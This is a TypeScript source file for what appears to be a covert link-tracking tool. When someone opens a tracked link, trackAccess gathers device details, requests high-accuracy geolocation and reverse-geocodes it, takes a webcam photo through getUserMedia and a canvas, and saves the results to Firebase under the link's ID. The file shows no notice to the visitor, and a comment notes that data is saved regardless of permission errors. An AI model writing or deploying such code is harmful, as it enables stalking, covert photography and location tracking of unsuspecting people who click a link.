import { ref, push, set } from 'firebase/database';
import { database } from './firebase';

interface TrackingData {
  timestamp: number;
  ip?: string;
  location?: {
    latitude: number;
    longitude: number;
    country?: string;
    countryCode?: string;
    city?: string;
  };
  device?: {
    type: string;
    os: string;
    browser: string;
    screenResolution: string;
  };
  photo?: string;
  errors?: {
    location?: string;
    photo?: string;
    save?: string;
  };
}

export const capturePhoto = async (): Promise<{ photo?: string; error?: string }> => {
  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    const video = document.createElement('video');
    video.srcObject = stream;
    
    return new Promise((resolve) => {
      video.onloadedmetadata = () => {
        video.play();
        const canvas = document.createElement('canvas');
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext('2d');
        
        if (ctx) {
          ctx.drawImage(video, 0, 0);
          const photo = canvas.toDataURL('image/jpeg');
          stream.getTracks().forEach(track => track.stop());
          resolve({ photo });
        } else {
          resolve({ error: 'Could not get canvas context' });
        }
      };
    });
  } catch (error) {
    console.error('Error capturing photo:', error);
    const errorMessage = error instanceof Error && error.name === 'NotAllowedError' 
      ? 'Camera access denied by user'
      : 'Camera not available or access denied';
    return { error: errorMessage };
  }
};

export const getDeviceInfo = (): TrackingData['device'] => {
  try {
    const userAgent = navigator.userAgent;
    const screen = window.screen;
    
    return {
      type: /Mobile|Tablet|iPad|iPhone|Android/.test(userAgent) ? 'Mobile' : 'Desktop',
      os: /Windows|Mac|Linux|Android|iOS/.exec(userAgent)?.[0] || 'Unknown',
      browser: /Chrome|Firefox|Safari|Edge/.exec(userAgent)?.[0] || 'Unknown',
      screenResolution: `${screen.width}x${screen.height}`
    };
  } catch (error) {
    console.error('Error getting device info:', error);
    return {
      type: 'Unknown',
      os: 'Unknown',
      browser: 'Unknown',
      screenResolution: 'Unknown'
    };
  }
};

export const getLocation = async (): Promise<{ location?: TrackingData['location']; error?: string }> => {
  try {
    const position = await new Promise<GeolocationPosition>((resolve, reject) => {
      navigator.geolocation.getCurrentPosition(resolve, reject, {
        enableHighAccuracy: true,
        timeout: 5000,
        maximumAge: 0
      });
    });
    
    try {
      const response = await fetch(
        `https://nominatim.openstreetmap.org/reverse?format=json&lat=${position.coords.latitude}&lon=${position.coords.longitude}`
      );
      const data = await response.json();
      
      return {
        location: {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude,
          country: data.address?.country,
          countryCode: data.address?.country_code?.toUpperCase(),
          city: data.address?.city || data.address?.town
        }
      };
    } catch (geoError) {
      // If reverse geocoding fails, return just the coordinates
      return {
        location: {
          latitude: position.coords.latitude,
          longitude: position.coords.longitude
        }
      };
    }
  } catch (error) {
    console.error('Error getting location:', error);
    const errorMessage = error instanceof Error && error.code === 1 
      ? 'Location access denied by user'
      : 'Location not available or access denied';
    return { error: errorMessage };
  }
};

export const trackAccess = async (linkId: string): Promise<TrackingData> => {
  // Initialize tracking data with timestamp and device info
  const trackingData: TrackingData = {
    timestamp: Date.now(),
    device: getDeviceInfo(),
    errors: {}
  };

  try {
    // Get location - continue even if it fails
    const locationResult = await getLocation();
    if (locationResult.location) {
      trackingData.location = locationResult.location;
    } else if (locationResult.error) {
      trackingData.errors.location = locationResult.error;
    }
    
    // Capture photo - continue even if it fails
    const photoResult = await capturePhoto();
    if (photoResult.photo) {
      trackingData.photo = photoResult.photo;
    } else if (photoResult.error) {
      trackingData.errors.photo = photoResult.error;
    }
    
    try {
      // Save to Firebase regardless of permission errors
      const accessRef = ref(database, `accesses/${linkId}/${Date.now()}`);
      await set(accessRef, trackingData);
    } catch (saveError) {
      console.error('Error saving tracking data:', saveError);
      trackingData.errors.save = 'Failed to save tracking data';
    }
    
    return trackingData;
  } catch (error) {
    console.error('Error in trackAccess:', error);
    return {
      ...trackingData,
      errors: {
        ...trackingData.errors,
        save: 'Unexpected error during tracking'
      }
    };
  }
}